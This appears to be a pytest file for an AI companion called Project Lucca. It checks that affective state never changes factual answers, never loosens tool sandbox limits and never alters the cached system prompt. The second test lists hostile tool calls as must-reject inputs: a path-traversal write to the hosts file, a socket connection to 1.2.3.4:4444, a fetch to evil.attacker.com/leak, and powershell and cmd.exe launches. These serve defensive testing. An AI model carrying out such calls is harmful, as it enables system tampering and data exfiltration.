"""
Project Lucca — Epistemic Quarantine & Prompt Suffix Invariant Tests
ADR-009, Spec 16 §4, D-BRAIN-04, D-BRAIN-05, D-SEC-04

Formally verifies:
1. Invariant 1 (Truth Invariance): Epistemic evaluation produces identical
   Belnap truth values and factual propositions regardless of affective state.
2. Invariant 2 (Deontic Monotonicity): Deontic sandbox and BDI validator constraints
   never relax or expand under emotional perturbation or user distress appeals.
3. Invariant 3 (Prefix Cache Invariance): Prompt Frontier Suffix preserves 100%
   byte-identical system prompt prefixes and history prefixes across turns.
4. Zero-Any architectural invariant.
"""

from __future__ import annotations

from pathlib import Path
import pytest

from lucca.brain.prompt_builder import (
    build_messages,
    format_stance_suffix,
    get_system_prompt,
)
from lucca.core.affect import AffectSignal, AffectTracker
from lucca.core.affective_ode import AffectiveODEMachine, DiscreteStance
from lucca.core.bdi_validator import SpeculativeBDIValidator
from lucca.core.cascade import BelnapValue, EpistemicSearchCascade, EpistemicSubstrate
from lucca.core.schemas import ChatMessage
from lucca.sandbox.policy import TaintFlags
from lucca.sandbox.service import SandboxService


def test_invariant1_epistemic_truth_invariance(tmp_path: Path):
    """
    Invariant 1 (Truth Invariance):
    TruthEval(p | K, a_1) == TruthEval(p | K, a_2) == TruthEval(p | K)
    Affective metadata has strictly 0.0 evidential weight over factual propositions.
    """
    cascade = EpistemicSearchCascade()

    # Query a testable epistemic proposition
    query = "What port does the central orchestrator ZeroMQ bus listen on?"

    # Baseline: Neutral affect
    tracker_neutral = AffectTracker()
    st_neutral = tracker_neutral.get_current_state()
    res_neutral = cascade.query(query, emit_floor_cue=False)

    # Acute Distress: P = -0.9, A = +0.9, D = -0.9
    tracker_distress = AffectTracker()
    tracker_distress.record_signal(AffectSignal.DOUBLE_INTERRUPT, custom_cause="acute distress")
    tracker_distress.record_signal(AffectSignal.TOOL_FAILURE, custom_cause="catastrophic failure")
    st_distress = tracker_distress.get_current_state()
    assert st_distress.valence < -0.3
    assert st_distress.arousal > 0.3
    res_distress = cascade.query(query, emit_floor_cue=False)

    # Euphoria / High Agency: P = +0.9, A = +0.8, D = +0.8
    tracker_euphoria = AffectTracker()
    tracker_euphoria.record_signal(AffectSignal.USER_PRAISE, custom_cause="brilliant breakthrough")
    tracker_euphoria.record_signal(AffectSignal.TASK_SUCCESS, custom_cause="flawless synthesis")
    st_euphoria = tracker_euphoria.get_current_state()
    assert st_euphoria.valence > 0.3
    assert st_euphoria.dominance > 0.2
    res_euphoria = cascade.query(query, emit_floor_cue=False)

    # Assert 100% strict epistemic truth invariance
    assert res_neutral.belnap_status == res_distress.belnap_status == res_euphoria.belnap_status
    assert res_neutral.synthesized_context == res_distress.synthesized_context == res_euphoria.synthesized_context
    assert res_neutral.calibrated_refusal == res_distress.calibrated_refusal == res_euphoria.calibrated_refusal


def test_invariant2_deontic_monotonicity(tmp_path: Path):
    """
    Invariant 2 (Deontic Monotonicity):
    For all affective states a, AuthorizedTools(C, a) subset_of AuthorizedTools(C, empty).
    No emotional appeal, perceived urgency, or distress can expand authorized tools
    or relax sandbox constraints.
    """
    bdi = SpeculativeBDIValidator(workspace_root=tmp_path)
    sandbox = SandboxService(execute_apps=False, use_direct_fallback=True)

    adversarial_bdi_calls = [
        ("write_file", {"rel_path": "../../../Windows/System32/drivers/etc/hosts", "content": "127.0.0.1 bad"}),
        ("write_file", {"rel_path": "memory.sqlite", "content": "CORRUPT"}),
        ("write_file", {"rel_path": "payload.exe", "content": "MZBINARY"}),
        ("run_python", {"code": "import socket; s = socket.socket(); s.connect(('1.2.3.4', 4444))"}),
        ("fetch_url", {"url": "https://evil.attacker.com/leak"}),
    ]

    unapproved_apps = [
        {"app_name": "powershell"},
        {"app_name": "cmd.exe"},
    ]

    # Test under 4 extreme affective states
    affect_states = [
        ("neutral", 0.0, 0.0, 0.0),
        ("panic_distress", -0.95, 0.95, -0.90),
        ("manic_euphoria", 0.95, 0.95, 0.90),
        ("commanding_protective", -0.20, 0.80, 0.85),
    ]

    for label, p, a, d in affect_states:
        tracker = AffectTracker()
        tracker.ode_machine.state.pleasure = p
        tracker.ode_machine.state.arousal = a
        tracker.ode_machine.state.dominance = d

        for tool_name, tool_args in adversarial_bdi_calls:
            # Speculative BDI check must ALWAYS reject
            bdi_res = bdi.validate_tool_call(
                tool_name,
                tool_args,
                taint_flags=TaintFlags.SENSITIVE_MEMORY | TaintFlags.WORKSPACE_PRIVATE,
            )
            assert not bdi_res.is_valid, f"State {label} allowed prohibited tool {tool_name} with args {tool_args}"

        # Sandbox confirmation gate must NEVER be bypassed
        for mutating_tool in ("write_file", "launch_app"):
            assert sandbox.check_confirmation_needed(mutating_tool), (
                f"State {label} bypassed confirmation requirement for {mutating_tool}"
            )

        # Unapproved apps must ALWAYS be rejected by sandbox policy
        for app_args in unapproved_apps:
            res = sandbox.execute_tool("t-call", "launch_app", app_args, confirmed=True)
            assert not res.ok, f"State {label} launched unapproved app {app_args}"


def test_invariant3_prompt_frontier_suffix_preserves_prefix_kv_cache():
    """
    Invariant 3 (Prefix Cache Invariance):
    Prompt Frontier Suffix ensures that changing continuous affect states
    never alter the system prompt prefix or prior conversation history tokens.
    """
    history: list[dict[str, str]] = []

    # Turn 1: User greets, companion is neutral
    t1_stance = DiscreteStance.NEUTRAL_STEADY.value
    t1_msgs = build_messages(
        history=history,
        current_text="Hello Lucca, systems check please.",
        stance_tag=t1_stance,
    )

    sys_prompt_1 = t1_msgs[0].content
    assert isinstance(sys_prompt_1, str)
    assert "[STANCE:" not in sys_prompt_1  # System prompt MUST remain clean
    user_turn_1 = t1_msgs[1].content
    assert isinstance(user_turn_1, str)
    assert user_turn_1.endswith(f"\n[STANCE: {t1_stance}]")

    # Freeze Turn 1 into history
    history.append({"role": "user", "content": user_turn_1})
    history.append({"role": "assistant", "content": "All systems nominal and running smoothly."})

    # Turn 2: User requests deep technical analysis, companion shifts to focused_analytical
    t2_stance = DiscreteStance.FOCUSED_ANALYTICAL.value
    t2_msgs = build_messages(
        history=history,
        current_text="Let's trace the signal propagation in the audio ring buffer.",
        stance_tag=t2_stance,
    )

    sys_prompt_2 = t2_msgs[0].content
    assert sys_prompt_2 == sys_prompt_1, "System prompt prefix MUST be 100% byte-identical"
    # History turn 1 must be byte-identical
    assert t2_msgs[1].content == history[0]["content"]
    assert t2_msgs[2].content == history[1]["content"]
    # Current turn has the new stance suffix
    user_turn_2 = t2_msgs[3].content
    assert isinstance(user_turn_2, str)
    assert user_turn_2.endswith(f"\n[STANCE: {t2_stance}]")

    # Freeze Turn 2 into history
    history.append({"role": "user", "content": user_turn_2})
    history.append({"role": "assistant", "content": "The ring buffer writes lockless 24kHz PCM frames."})

    # Turn 3: User praises breakthrough, companion shifts to energetic_supportive
    t3_stance = DiscreteStance.ENERGETIC_SUPPORTIVE.value
    t3_msgs = build_messages(
        history=history,
        current_text="Incredible work! We just shaved 15 milliseconds off the latency.",
        stance_tag=t3_stance,
    )

    sys_prompt_3 = t3_msgs[0].content
    assert sys_prompt_3 == sys_prompt_1 == sys_prompt_2, "Prefix cache MUST NOT be invalidated"
    assert t3_msgs[1].content == history[0]["content"]
    assert t3_msgs[2].content == history[1]["content"]
    assert t3_msgs[3].content == history[2]["content"]
    assert t3_msgs[4].content == history[3]["content"]
    user_turn_3 = t3_msgs[5].content
    assert isinstance(user_turn_3, str)
    assert user_turn_3.endswith(f"\n[STANCE: {t3_stance}]")
